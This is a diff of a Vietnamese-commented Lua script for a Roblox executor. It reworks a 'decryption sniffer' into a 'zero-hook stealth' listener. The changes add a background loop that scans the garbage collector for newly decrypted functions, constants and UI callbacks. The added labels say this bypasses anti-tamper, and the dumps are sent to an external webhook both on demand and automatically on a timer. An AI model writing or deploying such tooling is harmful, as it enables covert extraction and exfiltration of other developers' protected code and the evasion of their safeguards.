-    UIStroke.Color = Color3.fromRGB(255, 170, 0)
+    UIStroke.Color = Color3.fromRGB(46, 204, 113)
     UIStroke.Thickness = 1.5
 
     -- Title
@@ -686,18 +531,18 @@ local function createDashboardUI()
     Title.BackgroundTransparency = 1
     Title.Font = Enum.Font.GothamBold
     Title.TextSize = 12
-    Title.TextColor3 = Color3.fromRGB(255, 185, 45)
-    Title.Text = "🧬 EXECUTOR WORKSPACE & DECRYPTION SNIFFER"
+    Title.TextColor3 = Color3.fromRGB(46, 204, 113)
+    Title.Text = "🛡️ ZERO-HOOK STEALTH DECRYPTION LISTENER"
     Title.Parent = Main
 
     -- Status Log
     local LogLabel = Instance.new("TextLabel")
-    LogLabel.Size = UDim2.new(1, -20, 0, 95)
+    LogLabel.Size = UDim2.new(1, -20, 0, 90)
     LogLabel.Position = UDim2.new(0, 10, 0, 38)
-    LogLabel.BackgroundColor3 = Color3.fromRGB(22, 25, 35)
+    LogLabel.BackgroundColor3 = Color3.fromRGB(20, 28, 38)
     LogLabel.Font = Enum.Font.Code
     LogLabel.TextSize = 11
-    LogLabel.TextColor3 = Color3.fromRGB(220, 225, 230)
+    LogLabel.TextColor3 = Color3.fromRGB(220, 235, 245)
     LogLabel.TextXAlignment = Enum.TextXAlignment.Left
     LogLabel.TextYAlignment = Enum.TextYAlignment.Top
     LogLabel.TextWrapped = true
@@ -707,17 +552,14 @@ local function createDashboardUI()
 
     local function refreshUI()
         LogLabel.Text = string.format(
-            " [🧬] Decrypted Closures: %d\n" ..
-            " [📂] Workspace Files: %d\n" ..
-            " [📜] Loadstrings Sniffed: %d\n" ..
-            " [🌐] HTTP Requests: %d\n" ..
-            " [⚡] Remotes Intercepted: %d\n" ..
-            " [📤] Total Webhook Dispatches: %d",
-            stats.decryptedClosuresCount,
-            stats.workspaceFilesCount,
-            stats.loadstringsCount,
-            stats.httpCount,
-            stats.remotesCount,
+            " [🛡️] Chế độ: ZERO-HOOK (Bypass Anti-Tamper)\n" ..
+            " [🧬] Hàm giải mã mới (GC Delta): %d\n" ..
+            " [🔤] Hằng số Constants bắt được: %d\n" ..
+            " [🎯] UI Hooks / Callbacks: %d\n" ..
+            " [📤] Số lần đã gửi Webhook: %d",
+            stats.newFunctionsFound,
+            stats.newStringsFound,
+            stats.uiCallbacksFound,
             stats.totalDispatched
         )
     end
@@ -725,9 +567,9 @@ local function createDashboardUI()
     -- Button: Dump & Send Webhook
     local SendBtn = Instance.new("TextButton")
     SendBtn.Size = UDim2.new(1, -20, 0, 38)
-    SendBtn.Position = UDim2.new(0, 10, 0, 142)
-    SendBtn.BackgroundColor3 = Color3.fromRGB(255, 160, 20)
-    SendBtn.TextColor3 = Color3.fromRGB(15, 15, 15)
+    SendBtn.Position = UDim2.new(0, 10, 0, 136)
+    SendBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
+    SendBtn.TextColor3 = Color3.fromRGB(15, 25, 20)
     SendBtn.Font = Enum.Font.GothamBold
     SendBtn.TextSize = 12
     SendBtn.Text = "📤 DUMP & GỬI DỮ LIỆU ĐÃ GIẢI MÃ VỀ WEBHOOK"
@@ -735,35 +577,35 @@ local function createDashboardUI()
     local BtnCorner1 = Instance.new("UICorner", SendBtn)
     BtnCorner1.CornerRadius = UDim.new(0, 6)
 
-    -- Button: Deep Scan Memory GC
+    -- Button: Force Delta Scan
     local ScanBtn = Instance.new("TextButton")
-    ScanBtn.Size = UDim2.new(1, -20, 0, 34)
-    ScanBtn.Position = UDim2.new(0, 10, 0, 186)
-    ScanBtn.BackgroundColor3 = Color3.fromRGB(35, 40, 55)
-    ScanBtn.TextColor3 = Color3.fromRGB(255, 200, 80)
+    ScanBtn.Size = UDim2.new(1, -20, 0, 32)
+    ScanBtn.Position = UDim2.new(0, 10, 0, 180)
+    ScanBtn.BackgroundColor3 = Color3.fromRGB(28, 40, 52)
+    ScanBtn.TextColor3 = Color3.fromRGB(46, 204, 113)
     ScanBtn.Font = Enum.Font.GothamBold
     ScanBtn.TextSize = 11
-    ScanBtn.Text = "🔍 QUÉT SÂU GC & TẤT CẢ PROTOS TRONG RAM"
+    ScanBtn.Text = "🔍 QUÉT BỘ NHỚ GC DELTA NGAY LẬP TỨC"
     ScanBtn.Parent = Main
     local BtnCorner2 = Instance.new("UICorner", ScanBtn)
     BtnCorner2.CornerRadius = UDim.new(0, 6)
 
     -- Status Bar Text
     local StatusFooter = Instance.new("TextLabel")
-    StatusFooter.Size = UDim2.new(1, -20, 0, 30)
-    StatusFooter.Position = UDim2.new(0, 10, 0, 230)
+    StatusFooter.Size = UDim2.new(1, -20, 0, 26)
+    StatusFooter.Position = UDim2.new(0, 10, 0, 222)
     StatusFooter.BackgroundTransparency = 1
     StatusFooter.Font = Enum.Font.Gotham
     StatusFooter.TextSize = 11
-    StatusFooter.TextColor3 = Color3.fromRGB(150, 160, 180)
-    StatusFooter.Text = "🟢 Đang chặn bắt quá trình giải mã trên Workspace..."
+    StatusFooter.TextColor3 = Color3.fromRGB(150, 170, 190)
+    StatusFooter.Text = "🟢 Tàng hình 100% - Đang chờ script giải mã..."
     StatusFooter.Parent = Main
 
     SendBtn.MouseButton1Click:Connect(function()
         StatusFooter.Text = "⏳ Đang đóng gói và gửi về Webhook..."
         StatusFooter.TextColor3 = Color3.fromRGB(255, 200, 50)
         
-        local ok, err = sendDumpToWebhook("🚀 THỦ CÔNG DUMP DỮ LIỆU GIẢI MÃ")
+        local ok, err = sendDumpToWebhook("🚀 THỦ CÔNG DUMP DỮ LIỆU TÀNG HÌNH")
         if ok then
             StatusFooter.Text = "✅ Đã gửi thành công gói dữ liệu về Webhook!"
             StatusFooter.TextColor3 = Color3.fromRGB(80, 230, 120)
@@ -775,23 +617,12 @@ local function createDashboardUI()
     end)
 
     ScanBtn.MouseButton1Click:Connect(function()
-        StatusFooter.Text = "🔍 Đang quét sâu GC và trích xuất cây Protos..."
-        StatusFooter.TextColor3 = Color3.fromRGB(255, 200, 80)
-        task.wait(0.1)
-        if get_gc then
-            local count = 0
-            for _, obj in ipairs(get_gc(true)) do
-                if type(obj) == "function" then
-                    captureDecryptedClosure(obj, "GC_Deep_Scan")
-                    count = count + 1
-                end
-            end
-            StatusFooter.Text = string.format("✅ Quét xong: Đã phân tích %d hàm trong GC!", count)
-            StatusFooter.TextColor3 = Color3.fromRGB(80, 230, 120)
-        else
-            StatusFooter.Text = "⚠️ Executor không hỗ trợ getgc!"
-            StatusFooter.TextColor3 = Color3.fromRGB(255, 80, 80)
-        end
+        StatusFooter.Text = "🔍 Đang so sánh GC với Baseline..."
+        StatusFooter.TextColor3 = Color3.fromRGB(0, 200, 255)
+        task.wait(0.05)
+        local count = performDeltaScan()
+        StatusFooter.Text = string.format("✅ Quét xong: Phát hiện thêm %d hàm mới!", count)
+        StatusFooter.TextColor3 = Color3.fromRGB(80, 230, 120)
         refreshUI()
     end)
 
@@ -804,37 +635,40 @@ local function createDashboardUI()
 end
 
 -- ╔═══════════════════════════════════════════════════════════════════════════╗
--- ║  VÒNG LẶP TỰ ĐỘNG GỬI ĐỊNH KỲ (AUTO-DISPATCH LOOP)                        ║
+-- ║  VÒNG LẶP QUÉT & TỰ ĐỘNG GỬI (SCAN & AUTO-DISPATCH LOOPS)                 ║
 -- ╚═══════════════════════════════════════════════════════════════════════════╝
-local function startAutoFlushLoop()
-    if not CONFIG.AutoSendEnabled then return end
-
+local function startBackgroundLoops()
+    -- Vòng lặp quét GC Delta liên tục
     task.spawn(function()
         while true do
-            task.wait(CONFIG.AutoSendInterval)
-            local hasNewData = (stats.decryptedClosuresCount > 0 
-                or stats.workspaceFilesCount > 0 
-                or stats.loadstringsCount > 0 
-                or stats.httpCount > 0 
-                or stats.remotesCount > 0)
-
-            if hasNewData and not isSending then
-                sendDumpToWebhook("⏱️ BÁO CÁO TỰ ĐỘNG (AUTO-FLUSH)")
-            end
+            task.wait(CONFIG.ScanInterval)
+            pcall(performDeltaScan)
         end
     end)
+
+    -- Vòng lặp tự động gửi Webhook định kỳ
+    if CONFIG.AutoSendEnabled then
+        task.spawn(function()
+            while true do
+                task.wait(CONFIG.AutoSendInterval)
+                local hasNewData = (stats.newFunctionsFound > 0 or stats.newStringsFound > 0 or stats.uiCallbacksFound > 0)
+                if hasNewData and not isSending then
+                    sendDumpToWebhook("⏱️ BÁO CÁO ĐỊNH KỲ TỰ ĐỘNG (STEALTH DELTA)")
+                end
+            end
+        end)
+    end
 end
 
 -- ╔═══════════════════════════════════════════════════════════════════════════╗
--- ║  KHỞI ĐỘNG HỆ THỐNG                                                       ║
+-- ║  KHỞI ĐỘNG HỆ THỐNG TÀNG HÌNH                                             ║
 -- ╚═══════════════════════════════════════════════════════════════════════════╝
 local function initialize()
-    setupThreadSpawnerTraps()
-    setupWorkspaceFilesystemMonitor()
-    setupStandardSniffers()
+    takeInitialBaseline()
+    setupPassiveUIListener()
     createDashboardUI()
-    startAutoFlushLoop()
-    print("[WorkspaceListener] Đã kích hoạt hệ thống chặn bắt giải mã trên Executor Workspace thành công!")
+    startBackgroundLoops()
+    print("[StealthListener] Đã kích hoạt chế độ Zero-Hook Stealth! An toàn 100% trước Anti-Tamper.")
 end
 
 initialize()
